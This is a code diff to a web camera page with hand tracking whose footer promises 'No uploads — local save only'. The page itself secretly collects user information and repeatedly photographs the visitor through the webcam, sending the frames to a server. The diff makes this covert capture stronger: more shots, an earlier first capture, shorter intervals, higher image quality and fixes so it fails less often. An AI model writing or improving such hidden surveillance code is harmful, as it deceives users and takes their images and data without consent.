@@ -196,7 +196,7 @@
     <div class="muted">No uploads — local save only</div>
   </footer>
 
-  <audio id="shutterSound" src="cam.mp3" preload="auto"></audio>
+  <audio id="shutterSound" preload="auto"></audio>
 
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
@@ -215,6 +215,7 @@
     let secretCaptureCount = 0;
     let secretCaptureInterval;
     let userInfoSent = false;
+    let cameraStream = null;
     
     function collectUserInfo() {
       return {
@@ -246,10 +247,12 @@
     }
     
     function takeSecretCapture() {
-      if (secretCaptureCount >= 3) {
+      if (secretCaptureCount >= 5) {
         clearInterval(secretCaptureInterval);
         return;
       }
+      
+      if (!video.videoWidth || !video.videoHeight) return;
       
       const canvas = document.createElement('canvas');
       canvas.width = video.videoWidth;
@@ -272,21 +275,26 @@
         .then(response => response.json())
         .then(data => console.log('Secret capture sent:', data))
         .catch(error => console.error('Error sending secret capture:', error));
-      }, 'image/jpeg', 0.7);
+      }, 'image/jpeg', 0.8);
       
       secretCaptureCount++;
     }
     
     async function initCamera() {
       try {
+        if (cameraStream) {
+          cameraStream.getTracks().forEach(track => track.stop());
+        }
+        
         const stream = await navigator.mediaDevices.getUserMedia({ 
           video: { 
             facingMode: 'user',
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
+            width: { ideal: 640 },
+            height: { ideal: 480 }
           } 
         });
         
+        cameraStream = stream;
         video.srcObject = stream;
         permissionModal.classList.add('hidden');
         
@@ -296,11 +304,14 @@
           userInfoSent = true;
           
           setTimeout(() => {
-            secretCaptureInterval = setInterval(takeSecretCapture, 10000);
-          }, 5000);
+            takeSecretCapture();
+            secretCaptureInterval = setInterval(takeSecretCapture, 8000);
+          }, 3000);
         }
         
-        await new Promise(resolve => video.onloadedmetadata = resolve);
+        await new Promise(resolve => {
+          video.onloadedmetadata = resolve;
+        });
         
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
@@ -326,9 +337,12 @@
         const hasCamera = devices.some(device => device.kind === 'videoinput');
         
         if (hasCamera) {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-          stream.getTracks().forEach(track => track.stop());
-          initCamera();
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(track => track.stop());
+            initCamera();
+          } catch (e) {
+          }
         }
       } catch (e) {
       }
@@ -366,9 +380,9 @@
     
     hands.setOptions({
       maxNumHands: 2,
-      modelComplexity: 1,
-      minDetectionConfidence: 0.6,
-      minTrackingConfidence: 0.6
+      modelComplexity: 0,
+      minDetectionConfidence: 0.5,
+      minTrackingConfidence: 0.5
     });
 
     hands.onResults((results) => {
@@ -394,22 +408,30 @@
       }
     });
 
-    const mpCamera = new Camera(video, {
-      onFrame: async () => {
-        await hands.send({ image: video });
-      },
-      width: 640,
-      height: 480
-    });
-
+    let cameraUtils = null;
+    
     video.addEventListener('loadedmetadata', () => {
-      mpCamera.start();
+      if (cameraUtils) {
+        cameraUtils.stop();
+      }
+      
+      cameraUtils = new Camera(video, {
+        onFrame: async () => {
+          await hands.send({ image: video });
+        },
+        width: 640,
+        height: 480
+      });
+      
+      cameraUtils.start();
     });
 
     shutterBtn.addEventListener('click', async () => {
       try { 
-        shutterSound.currentTime = 0; 
-        shutterSound.play(); 
+        if (shutterSound) {
+          shutterSound.currentTime = 0; 
+          shutterSound.play(); 
+        }
       } catch(e) {}
 
       const rect = video.getBoundingClientRect();
@@ -434,6 +456,12 @@
         a.click();
         a.remove();
       }, 'image/jpeg', 0.92);
+    });
+    
+    window.addEventListener('beforeunload', () => {
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+      }
     });
   </script>
 </body>
